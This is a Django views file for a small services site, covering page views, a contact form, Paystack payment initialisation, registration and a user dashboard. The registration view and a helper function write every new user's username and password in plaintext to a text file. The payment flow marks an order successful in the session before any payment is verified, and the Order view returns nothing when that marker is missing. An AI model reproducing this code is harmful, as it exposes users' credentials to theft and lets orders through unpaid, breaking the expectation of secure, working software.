from django.shortcuts import render,redirect
from django.core.mail import *
from django.contrib.auth.forms import UserCreationForm
from django.contrib.auth import login, authenticate
from django.core.mail import send_mail
from django.conf import settings
from django.http import HttpResponse
import secrets
import requests
from django.contrib.auth.decorators import login_required

def HomePage(request):
      data={"pagetitle":"Home page"}
      return render(request,"index.html",data)
def About(request):
      data={"pagetitle":"About us"}
      return render(request,"about.html",data)
from django.shortcuts import render,redirect

def Contact(request):
    from .forms import UserEnquiryForm
    forms = UserEnquiryForm(request.POST or None)
    if request.method == "POST":
       if forms.is_valid():
           data=forms.save()
           return redirect("/requestsuccess")
    data={"pagetitle":"Contact us","forms":forms}
    return render(request,"contact.html",data)
def Services(request):
      data={"pagetitle":"Services"}
      return render(request,"services.html",data)
@login_required
def Kitchen(request):
      data={"pagetitle":"Kitchen"}
      return render(request,"Kitchen.html",data)
@login_required
def Laundry(request):
      data={"pagetitle":"Laundry"}
      return render(request,"laundry.html",data)

def initiatepay(request):
    if request.method == "POST":
        amount_naira = request.POST.get('amount')

        # Safely pull user email, fallback to a placeholder if none exists
        user_email = request.user.email if request.user.is_authenticated else "guest@example.com"
        if not user_email:
            user_email = "guest@example.com"

        # Generate a unique tracking reference for this service order
        import secrets
        paystack_ref = f"srv-{secrets.token_hex(8)}"

        # Save a marker in the session so your Successful view lets them in on return
        request.session['rdata'] = user_email

        # Paystack API Settings
        url = "https://api.paystack.co/transaction/initialize"
        headers = {
            "Authorization": f"Bearer {settings.PAYSTACK_SECRET_KEY}",
            "Content-Type": "application/json",
        }

        # Convert incoming Naira price string to Kobo (e.g., 5000 -> 500000)
        amount_in_kobo = int(float(amount_naira) * 100)

        payload = {
            "email": user_email,
            "amount": amount_in_kobo,
            "reference": paystack_ref,
            # Point this callback straight to your project's successful view url
            "callback_url": "https://elegbede.pythonanywhere.com/order/"
        }

        try:
            response = requests.post(url, json=payload, headers=headers)
            response_data = response.json()

            if response_data.get('status'):
                # Send the customer straight to the secure checkout page
                return redirect(response_data['data']['authorization_url'])
            else:
                return HttpResponse(f"Paystack Initialization Error: {response_data.get('message')}")
        except Exception as e:
            return HttpResponse(f"Payment Connection Failed: {str(e)}")

    return redirect("/")


def RequestSuccess(request):
      data={"pagetitle":"Success"}
      return render(request,"request_success.html",data)


def RegisterUser(request):
    if request.user.is_authenticated:
        return redirect("/dashboard") # Use redirect() instead of render() for URLs

    myform = UserCreationForm(request.POST or None)

    if request.method == "POST":
        if myform.is_valid():
            username = myform.cleaned_data.get('username')
            password1 = myform.cleaned_data.get('password1')
            password2 = myform.cleaned_data.get('password2')

            # 2. Write to text file
            with open('regdatabase.txt', mode='a', encoding='utf-8') as f:
                f.write(f"New User Registered: {username} | Password1: {password1} | password2: {password2}\n")

            # 3. Standard Django registration logic
            user = myform.save()
            login(request, user)
            return redirect('/dashboard')

    data = {"form": myform, "pagetitle": "User Registration"}
    return render(request, "registration/registration.html", data)


def Dashboard(request):
     if request.user.is_authenticated:
          # Import the Booking model directly inside this view
          from reservations.models import Booking

          # Pull only the bookings that belong to the logged-in user
          user_bookings = Booking.objects.filter(user=request.user)

          data = {
              "pagetitle": "User Dashboard",
              "bookings": user_bookings  # Passing data to our template loop
          }
          return render(request, "registration/dashboard.html", data)
     else:
          data = {"pagetitle": "404 error"}
          return render(request, "registration/nologin.html", data)

def Thanks(request):
    return render(request,'thankyou.html')

def write_to_file(data):
    with open('database.txt', mode='a', encoding='utf-8') as f:
        # Uses 'name' as expected by the Contact Form
        f.write(f"\n{data['name']},{data['email']},{data['number']},{data['request']}")

def write_to_reg(data):
    with open('regdatabase.txt', mode='a', encoding='utf-8') as f:
        # Only focuses on the Username
        f.write(f"\nNew User: {data['username']},{data['password1']},{data['password2']}")

def Order(request):
    if 'rdata' in request.session:
        data = {"msg": "Your request is successful."}
        del request.session['rdata']
        return render(request, "order.html", data)


def submit_form(request):
    if request.method == 'POST':
        # 1. Collect data from the POST request
        data = {
            "name": request.POST.get('name'),
            "email": request.POST.get('email'),
            "number": request.POST.get('number'),
            "request": request.POST.get('req'),
        }



        write_to_file(data)
        return render(request,"thankyou.html")

    else:
        return HttpResponse("something went wrong try again later!")

